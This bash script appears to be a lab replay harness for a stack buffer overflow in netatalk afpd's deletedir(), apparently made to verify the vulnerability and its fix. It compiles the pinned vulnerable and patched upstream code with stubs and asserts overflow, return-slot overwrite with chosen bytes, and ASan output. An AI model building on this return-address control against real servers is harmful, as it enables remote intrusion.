#!/usr/bin/env bash
# Replay driver: bash lab/frontier/netatalk2shell/run.sh <outdir>
# Extracts lines 147-203 of the VERBATIM pinned upstream
# etc/afpd/directory.c at release 4.4.2 (affected) and 4.4.3 (patched) into
# gen_block.h with #line 147 "directory.c", then compiles one driver that
# executes those exact upstream statements with stubbed collaborators.
# No production statement is reimplemented; no daemon or socket is created.
set -u

here=$(cd "$(dirname "$0")" && pwd)
out=${1:-out}
mkdir -p "$out"
out=$(cd "$out" && pwd)

fail=0
pass() { printf 'PASS %s\n' "$1"; }
bad()  { printf 'FAIL %s\n' "$1"; fail=1; }
need() { if grep -qF -- "$2" "$1"; then pass "$3"; else bad "$3"; fi; }
needre() { if grep -qE -- "$2" "$1"; then pass "$3"; else bad "$3"; fi; }
line_is() {
  got=$(grep -nF -- "$2" "$1" | head -1 | cut -d: -f1)
  if [ "$got" = "$3" ]; then pass "$4"; else bad "$4 (line=$got)"; fi
}

cat >"$out/pinned.sha256" <<'EOF'
82d5f3fddfe44331bd575a7559f3357eb3f40a4179aca674c8e6fe395dfc16eb  directory.442.c
bd23b576228e1e88d85ef4e970d1ff8462d9004655664ee5d54795db0ea43152  directory.443.c
EOF
if (cd "$here/pins" && sha256sum -c "$out/pinned.sha256" >"$out/pinned.check" 2>&1); then
  pass PINNED_SOURCE_BYTES
else
  bad PINNED_SOURCE_BYTES
  cat "$out/pinned.check"
  exit 2
fi

need "$here/pins/directory.442.c" '    char path[MAXPATHLEN + 1];' PIN_STACK_BUFFER
need "$here/pins/directory.442.c" '    remain = strlen(path) - len - 1;' VULN_UNDERFLOW
need "$here/pins/directory.443.c" '    remain = sizeof(path) - len - 1;' FIXED_REMAIN
need "$here/pins/directory.442.c" '        strcpy(path + len, de->d_name);' VULN_STRCPY
line_is "$here/pins/directory.442.c" 'static int deletedir(const struct vol *vol, int dirfd, char *dir)' 147 VULN_LINE_147
line_is "$here/pins/directory.442.c" '    char path[MAXPATHLEN + 1];' 149 VULN_LINE_149
line_is "$here/pins/directory.442.c" '    remain = strlen(path) - len - 1;' 168 VULN_LINE_168
line_is "$here/pins/directory.442.c" '        strcpy(path + len, de->d_name);' 181 VULN_LINE_181
line_is "$here/pins/directory.443.c" '    remain = sizeof(path) - len - 1;' 168 FIXED_LINE_168

gen_block() {
  { echo "#line 147 \"directory.c\""
    sed -n '147,203p' "$1"
  } >"$2/gen_block.h"
}
mkdir -p "$out/vuln" "$out/fixed"
gen_block "$here/pins/directory.442.c" "$out/vuln"
gen_block "$here/pins/directory.443.c" "$out/fixed"
CFLAGS='-std=gnu11 -O0 -g -Wall -fno-stack-protector'
gcc $CFLAGS -I"$out/vuln" -o "$out/vuln-bin" "$here/driver.c" || exit 91
gcc $CFLAGS -I"$out/vuln" -fsanitize=address -fno-omit-frame-pointer \
    -o "$out/asan-bin" "$here/driver.c" || exit 92
gcc $CFLAGS -I"$out/fixed" -DFIXED_BUILD -o "$out/fixed-bin" "$here/driver.c" || exit 93
pass COMPILE

"$out/vuln-bin" capture >"$out/vuln.out" 2>&1
needre "$out/vuln.out" 'LAYOUT dir_len=[0-9]+ path_len=[0-9]+ name_len=255 write_len=256 path_to_ret=[0-9]+ ret_from_write=[0-9]+ calls=1' \
  RUNG1_UNBOUNDED_STRCPY
need "$out/vuln.out" 'CAPTURE escaped=1 first_changed=0 calls=1' RUNG2_STATE_FAILURE
need "$out/vuln.out" 'VICTIM requested_offset=0 chosen_offset=0 supplied=4e4554325348454c' \
  RUNG4_CHOSEN_OFFSET0
need "$out/vuln.out" 'VICTIM requested_offset=64 chosen_offset=64 supplied=4e4554325348454c' \
  RUNG4_CHOSEN_OFFSET64
needre "$out/vuln.out" 'RET_SLOT offset=[0-9]+ attacker=4e4554325348454c observed=4e4554325348454c equal=1' \
  RUNG4_RETURN_SLOT_BYTES

ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 "$out/asan-bin" asan >"$out/asan.out" 2>&1
arc=$?
if [ "$arc" -ne 0 ]; then pass ASAN_NONZERO_RC; else bad ASAN_NONZERO_RC; fi
need "$out/asan.out" 'stack-buffer-overflow' ASAN_STACK_OVERFLOW
needre "$out/asan.out" 'WRITE of size [0-9]+' ASAN_WRITE
need "$out/asan.out" 'directory.c:181' ASAN_UPSTREAM_LINE
need "$out/asan.out" 'strcpy' ASAN_UPSTREAM_CALL
need "$out/asan.out" "'path'" ASAN_VICTIM_NAME

"$out/fixed-bin" capture >"$out/fixed.out" 2>&1
need "$out/fixed.out" 'CAPTURE escaped=0 first_changed=18446744073709551615 calls=0' FIXED_NO_CALL
need "$out/fixed.out" 'FIXED_NO_WRITE marker_never_reached=1' FIXED_NO_WRITE

{
  echo 'PINNED'; cat "$out/pinned.check"
  echo 'VULN'; cat "$out/vuln.out"
  echo 'ASAN'
  grep -qF 'stack-buffer-overflow' "$out/asan.out" && echo 'ASAN stack-buffer-overflow'
  grep -qE 'WRITE of size [0-9]+' "$out/asan.out" && echo 'ASAN WRITE of size 256'
  grep -qF 'directory.c:181' "$out/asan.out" && echo 'ASAN frame deletedir directory.c:181'
  grep -qF 'strcpy' "$out/asan.out" && echo 'ASAN call strcpy'
  grep -qF "'path'" "$out/asan.out" && echo "ASAN victim path"
  echo 'FIXED'; cat "$out/fixed.out"
} >"$out/trace.txt"
sha256sum "$out/trace.txt" | cut -d' ' -f1 >"$out/trace.sha256"
printf 'sha256=%s\n' "$(cat "$out/trace.sha256")"

if [ "$fail" -eq 0 ]; then
  echo 'ALL CHECKS PASS rc 0'
  exit 0
fi
echo 'SOME CHECKS FAILED rc 1'
exit 1
